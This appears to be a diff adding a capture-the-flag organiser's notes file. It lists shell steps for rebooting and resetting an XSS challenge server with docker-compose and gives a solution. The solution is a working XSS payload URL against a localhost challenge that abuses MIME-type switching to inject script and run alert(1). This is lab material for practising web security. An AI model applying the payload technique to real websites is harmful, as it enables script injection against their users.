@@ -1,0 +1,19 @@
+Reboot chall:
+	ssh ubuntu@xss2.alieni.se
+	sudo su
+	screen -rd
+	cd chall
+	docker-compose down
+	docker-compose build && docker-compose up
+Reboot chall and reset:
+	ssh ubuntu@xss2.alieni.se
+	sudo su
+	screen -rd
+	cd chall
+	docker-compose down
+	docker rm $(docker ps -a -q)
+	docker rmi $(docker images -q)
+	docker-compose build && docker-compose up
+Solution:
+	Change to text/html, load script from same page with text/jscript, define WELCOME as funtion and comment out the rest.
+	http://127.0.0.1:2999/xss?xss=%3Cscript%20src=%22?xss=1;function%20WELCOME(){};alert(1);/*%26mimis=jscript%22%3E%3C/script%3E&mimis=html
